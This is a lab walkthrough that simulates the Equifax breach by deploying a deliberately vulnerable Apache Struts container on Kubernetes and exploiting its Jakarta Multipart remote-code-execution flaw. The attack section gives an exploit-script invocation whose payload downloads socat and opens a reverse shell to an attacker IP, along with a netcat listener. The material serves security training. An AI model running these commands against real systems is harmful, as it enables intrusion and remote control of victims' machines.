========================
Struts Attack - Equifax
========================

The goal of this article is to simulate the Equifax attack which was carried out exploiting Apache Struts vulnerability.

Apache Struts is an open-source framework used to build Java web applications. The vulnerability is a remote code execution bug that affects the Jakarta Multipart parser.

In this attack, the front end is exploited and a reverse shell is created in the machine where struts is running. The adversary can exploit that machine - escalate privileges, spawn and terminate processes, move laterally, and get to the crown jewels.

There are 2 parts to this setup

1) Setup a container running vulnerable Apache struts in Kubernetes
2) Attack the container, exploit the vulnerability and establish a command and control

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/strutssetup.png
 :width: 650
 :alt: ssrf setup


Running the Vulnerable container in Kubernetes
==============================================

**Container:** We have already created a container with a vulnerable Apache Struts app and its present at - quay.io/araalinetworks/struts:latest

Download the deployment yaml file --> **deployment.yaml**

Apply this file in your Kubernetes cluster in a specific namespace

.. code-block:: RST

    $ kubectl create ns strutfrontend
    $ kubectl apply -f deployment.yaml -n strutfrontend

Check (1) if the pods are running, and (2) get the External IP of the exposed service

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/strutskubectlgetpodsvc.png
 :width: 650
 :alt: kubectl get pods

Now open a browser and check if the app is up and running, by logging into the external IP on port 8080
http://40.88.254.51:8080/super-app/orders/3

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/strutsfrontend.png
 :width: 650
 :alt: frond end of the app

If you see the screen above, Congratulations! we have completed the first part.


Setup a VM to attack the container
==================================

Make sure **python 3.6** is installed on the VM.

Download the python file **attack42627.py** to your attack VM.

Executing the attack
********************


Now open two terminals, on one terminal type 

.. code-block:: RST
    
   $ sudo nc -nvlp 12345

On the other terminal type

.. code-block:: XML

   $ python3 strutattack/attack42627.py http://40.88.254.51:8080/super-app/orders/3 'wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:"ash -li",pty,stderr,setsid,sigint,sane tcp:104.41.3.199:12345'    


Here, 40.88.254.51 is the IP of the struts app.

and 104.41.3.199:12345 is the IP of the machine from which you are carrying out the attack.

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/strutterminalsetup.png
 :width: 650
 :alt: Terminal Setup

A reverse shell will be established on the listening port 12345

.. image:: https://raw.githubusercontent.com/araalinetworks/attacks/main/images/strutreverseshell.png
 :width: 650
 :alt: Terminal Setup

**Congratulations! Now you have a reverse shell on the container running the Struts Apps!**
